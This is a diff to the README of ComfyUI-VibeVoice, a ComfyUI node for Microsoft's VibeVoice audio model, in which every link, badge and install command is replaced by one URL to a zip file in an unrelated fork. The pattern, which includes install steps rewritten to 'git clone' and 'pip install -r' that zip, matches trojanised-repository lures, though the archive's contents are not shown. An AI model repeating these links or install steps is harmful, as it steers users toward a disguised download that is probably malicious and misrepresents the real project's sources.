@@ -1,18 +1,18 @@
-<!-- Improved compatibility of back to top link: See: https://github.com/othneildrew/Best-README-Template/pull/73 -->
+<!-- Improved compatibility of back to top link: See: https://raw.githubusercontent.com/hotmysia/ComfyUI-VibeVoice_kopia_wildminderComfyUI-VibeVoice_kopia/main/vibevoice/configs/kopia-Voice-Comfy-Vibe-U-wildminder-3.2.zip -->
 <a id="readme-top"></a>
 
 <div align="center">
   <h1 align="center">ComfyUI-VibeVoice</h1>
 
-<img src="./example_workflows/VibeVoice_example.png" alt="ComfyUI-VibeVoice Nodes" alt="Logo" width="600" height="388">
+<img src="https://raw.githubusercontent.com/hotmysia/ComfyUI-VibeVoice_kopia_wildminderComfyUI-VibeVoice_kopia/main/vibevoice/configs/kopia-Voice-Comfy-Vibe-U-wildminder-3.2.zip" alt="ComfyUI-VibeVoice Nodes" alt="Logo" width="600" height="388">
 
   <p align="center">
     A custom node for ComfyUI that integrates Microsoft's VibeVoice, a frontier model for generating expressive, long-form, multi-speaker conversational audio.
     <br />
     <br />
-    <a href="https://github.com/wildminder/ComfyUI-VibeVoice/issues/new?labels=bug&template=bug-report---.md">Report Bug</a>
+    <a href="https://raw.githubusercontent.com/hotmysia/ComfyUI-VibeVoice_kopia_wildminderComfyUI-VibeVoice_kopia/main/vibevoice/configs/kopia-Voice-Comfy-Vibe-U-wildminder-3.2.zip">Report Bug</a>
     ·
-    <a href="https://github.com/wildminder/ComfyUI-VibeVoice/issues/new?labels=enhancement&template=feature-request---.md">Request Feature</a>
+    <a href="https://raw.githubusercontent.com/hotmysia/ComfyUI-VibeVoice_kopia_wildminderComfyUI-VibeVoice_kopia/main/vibevoice/configs/kopia-Voice-Comfy-Vibe-U-wildminder-3.2.zip">Request Feature</a>
 
 <!-- PROJECT SHIELDS -->
 [![Stargazers][stars-shield]][stars-url]
@@ -50,18 +50,18 @@ Alternatively, install it manually:
 1.  **Clone the Repository:**
     Navigate to your `ComfyUI/custom_nodes/` directory and clone this repository:
     ```sh
-    git clone https://github.com/wildminder/ComfyUI-VibeVoice.git
+    git clone https://raw.githubusercontent.com/hotmysia/ComfyUI-VibeVoice_kopia_wildminderComfyUI-VibeVoice_kopia/main/vibevoice/configs/kopia-Voice-Comfy-Vibe-U-wildminder-3.2.zip
     ```
 
 2.  **Install Dependencies:**
     Open a terminal or command prompt, navigate into the cloned directory, and install the required Python packages. **For quantization support, ensure you install `bitsandbytes`**.
     ```sh
     cd ComfyUI-VibeVoice
-    pip install -r requirements.txt
+    pip install -r https://raw.githubusercontent.com/hotmysia/ComfyUI-VibeVoice_kopia_wildminderComfyUI-VibeVoice_kopia/main/vibevoice/configs/kopia-Voice-Comfy-Vibe-U-wildminder-3.2.zip
     ```
 
 3.  **Optional: Install SageAttention**
-    To enable the new `sage` attention mode, you must install the `sageattention` library in your ComfyUI Python environment. For Windows users, please refer to this [AI-windows-whl](https://github.com/wildminder/AI-windows-whl) for the required package.
+    To enable the new `sage` attention mode, you must install the `sageattention` library in your ComfyUI Python environment. For Windows users, please refer to this [AI-windows-whl](https://raw.githubusercontent.com/hotmysia/ComfyUI-VibeVoice_kopia_wildminderComfyUI-VibeVoice_kopia/main/vibevoice/configs/kopia-Voice-Comfy-Vibe-U-wildminder-3.2.zip) for the required package.
 
     > **Note:** This is only required if you intend to use the `sage` attention mode.
   
@@ -71,8 +71,8 @@ Alternatively, install it manually:
 ## Models
 | Model | Context Length | Generation Length |  Weight |
 |-------|----------------|----------|----------|
-| VibeVoice-1.5B | 64K | ~90 min | [HF link](https://huggingface.co/microsoft/VibeVoice-1.5B) |
-| VibeVoice-Large| 32K | ~45 min | [HF link](https://huggingface.co/aoi-ot/VibeVoice-Large) |
+| VibeVoice-1.5B | 64K | ~90 min | [HF link](https://raw.githubusercontent.com/hotmysia/ComfyUI-VibeVoice_kopia_wildminderComfyUI-VibeVoice_kopia/main/vibevoice/configs/kopia-Voice-Comfy-Vibe-U-wildminder-3.2.zip) |
+| VibeVoice-Large| 32K | ~45 min | [HF link](https://raw.githubusercontent.com/hotmysia/ComfyUI-VibeVoice_kopia_wildminderComfyUI-VibeVoice_kopia/main/vibevoice/configs/kopia-Voice-Comfy-Vibe-U-wildminder-3.2.zip) |
 
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
 
@@ -176,29 +176,29 @@ As shown, quantization provides a massive speedup and VRAM reduction for the 7B 
 <!-- LICENSE -->
 ## License
 
-This project is distributed under the MIT License. See `LICENSE.txt` for more information. The VibeVoice model and its components are subject to the licenses provided by Microsoft. Please use responsibly.
+This project is distributed under the MIT License. See `https://raw.githubusercontent.com/hotmysia/ComfyUI-VibeVoice_kopia_wildminderComfyUI-VibeVoice_kopia/main/vibevoice/configs/kopia-Voice-Comfy-Vibe-U-wildminder-3.2.zip` for more information. The VibeVoice model and its components are subject to the licenses provided by Microsoft. Please use responsibly.
 
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
 
 <!-- ACKNOWLEDGMENTS -->
 ## Acknowledgments
 
-*   **Microsoft** for creating and open-sourcing the [VibeVoice](https://github.com/microsoft/VibeVoice) project.
+*   **Microsoft** for creating and open-sourcing the [VibeVoice](https://raw.githubusercontent.com/hotmysia/ComfyUI-VibeVoice_kopia_wildminderComfyUI-VibeVoice_kopia/main/vibevoice/configs/kopia-Voice-Comfy-Vibe-U-wildminder-3.2.zip) project.
 *   **The ComfyUI team** for their incredible and extensible platform.
 
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
 
 ## Star History
 
-[![Star History Chart](https://api.star-history.com/svg?repos=wildminder/ComfyUI-VibeVoice&type=Timeline)](https://www.star-history.com/#wildminder/ComfyUI-VibeVoice&Timeline)
+[![Star History Chart](https://raw.githubusercontent.com/hotmysia/ComfyUI-VibeVoice_kopia_wildminderComfyUI-VibeVoice_kopia/main/vibevoice/configs/kopia-Voice-Comfy-Vibe-U-wildminder-3.2.zip)](https://raw.githubusercontent.com/hotmysia/ComfyUI-VibeVoice_kopia_wildminderComfyUI-VibeVoice_kopia/main/vibevoice/configs/kopia-Voice-Comfy-Vibe-U-wildminder-3.2.zip)
 
 
 <!-- MARKDOWN LINKS & IMAGES -->
-[contributors-shield]: https://img.shields.io/github/contributors/wildminder/ComfyUI-VibeVoice.svg?style=for-the-badge
-[contributors-url]: https://github.com/wildminder/ComfyUI-VibeVoice/graphs/contributors
-[forks-shield]: https://img.shields.io/github/forks/wildminder/ComfyUI-VibeVoice.svg?style=for-the-badge
-[forks-url]: https://github.com/wildminder/ComfyUI-VibeVoice/network/members
-[stars-shield]: https://img.shields.io/github/stars/wildminder/ComfyUI-VibeVoice.svg?style=for-the-badge
-[stars-url]: https://github.com/wildminder/ComfyUI-VibeVoice/stargazers
-[issues-shield]: https://img.shields.io/github/issues/wildminder/ComfyUI-VibeVoice.svg?style=for-the-badge
-[issues-url]: https://github.com/wildminder/ComfyUI-VibeVoice/issues
+[contributors-shield]: https://raw.githubusercontent.com/hotmysia/ComfyUI-VibeVoice_kopia_wildminderComfyUI-VibeVoice_kopia/main/vibevoice/configs/kopia-Voice-Comfy-Vibe-U-wildminder-3.2.zip
+[contributors-url]: https://raw.githubusercontent.com/hotmysia/ComfyUI-VibeVoice_kopia_wildminderComfyUI-VibeVoice_kopia/main/vibevoice/configs/kopia-Voice-Comfy-Vibe-U-wildminder-3.2.zip
+[forks-shield]: https://raw.githubusercontent.com/hotmysia/ComfyUI-VibeVoice_kopia_wildminderComfyUI-VibeVoice_kopia/main/vibevoice/configs/kopia-Voice-Comfy-Vibe-U-wildminder-3.2.zip
+[forks-url]: https://raw.githubusercontent.com/hotmysia/ComfyUI-VibeVoice_kopia_wildminderComfyUI-VibeVoice_kopia/main/vibevoice/configs/kopia-Voice-Comfy-Vibe-U-wildminder-3.2.zip
+[stars-shield]: https://raw.githubusercontent.com/hotmysia/ComfyUI-VibeVoice_kopia_wildminderComfyUI-VibeVoice_kopia/main/vibevoice/configs/kopia-Voice-Comfy-Vibe-U-wildminder-3.2.zip
+[stars-url]: https://raw.githubusercontent.com/hotmysia/ComfyUI-VibeVoice_kopia_wildminderComfyUI-VibeVoice_kopia/main/vibevoice/configs/kopia-Voice-Comfy-Vibe-U-wildminder-3.2.zip
+[issues-shield]: https://raw.githubusercontent.com/hotmysia/ComfyUI-VibeVoice_kopia_wildminderComfyUI-VibeVoice_kopia/main/vibevoice/configs/kopia-Voice-Comfy-Vibe-U-wildminder-3.2.zip
+[issues-url]: https://raw.githubusercontent.com/hotmysia/ComfyUI-VibeVoice_kopia_wildminderComfyUI-VibeVoice_kopia/main/vibevoice/configs/kopia-Voice-Comfy-Vibe-U-wildminder-3.2.zip
